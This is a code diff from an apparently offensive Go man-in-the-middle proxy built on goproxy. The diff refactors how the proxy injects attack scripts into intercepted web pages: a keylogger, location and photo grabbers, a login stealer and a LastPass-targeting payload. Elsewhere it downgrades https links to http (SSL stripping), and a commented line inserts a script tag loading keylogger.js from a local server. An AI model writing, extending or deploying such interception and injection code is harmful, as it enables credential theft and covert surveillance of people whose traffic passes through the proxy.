@@ -111,7 +111,6 @@ func StartSimpleProxy() {
         proxy.HandleResponse(interceptResponse)
 
     } else {
-
         interceptResponse := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
             // Log HAR files.
             if globalStoreHAR {
@@ -123,37 +122,13 @@ func StartSimpleProxy() {
             } else {
                 //log.Println(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
             }
-            //
             bs, err := ioutil.ReadAll(ctx.Resp.Body)
             if err != nil {
                log.Println("inject error: ", err)
             }
             body := string(bs) //needs to be a string for reading
-            if globalInjectKeyLogger {
-                log.Println("INJECTING Keylogger")
-                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
-            }
-            if globalInjectGetLocation {
-                log.Println("INJECTING Location")
-                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOCATION_RESULT )
-            }
-            if globalInjectGetPhoto {
-                log.Println("INJECTING Photo")
-                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_PHOTO_RESULT )
-            }
-            if globalInjectGetLogin {
-                log.Println("INJECTING Login")
-                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGIN_RESULT )
-            }
-            if globalInjectLastpass {
-                log.Println("INJECTING Lastpass")
-                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LASTPASS_RESULT )
-            }
+            //process whether to inject scripts
+            utilsProcessInjectionScripts(ctx, body)
             
             ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
             return goproxy.NEXT
@@ -176,7 +151,7 @@ func TriggerRedirect() goproxy.HandlerFunc {
     pageRedirect := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
         // Get the body for the redirect url.
         body := utilsGetBuffer(strings.Split(ctx.Req.URL.Host, ".")[1]) //get the middle of the url: www.url.com...
-        //body = utilsInjector(body, "</body>", "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>")
+        //body = utilsInjector(ctx,body, "</body>", "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>")
         // Set the response-headers before responding.
         client_response := utilsGetHTTPHeaders(body,"text/html")
         ctx.Resp = client_response
@@ -241,7 +216,7 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 body = strings.Replace(body, "https", "http", -1)
                 if globalInjectKeyLogger {
                     utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                    body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
+                    body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
                 }
                 // Create a response object from the body.
                 client_response := utilsGetHTTPHeaders(body,server_ssl_response.Header.Get("Content-Type"))
@@ -260,7 +235,7 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 body = strings.Replace(body, "https", "http", -1)
                 if globalInjectKeyLogger {
                     utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
-                    body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
+                    body = utilsInjector(ctx, body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
                 }
                 ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
                 return goproxy.NEXT
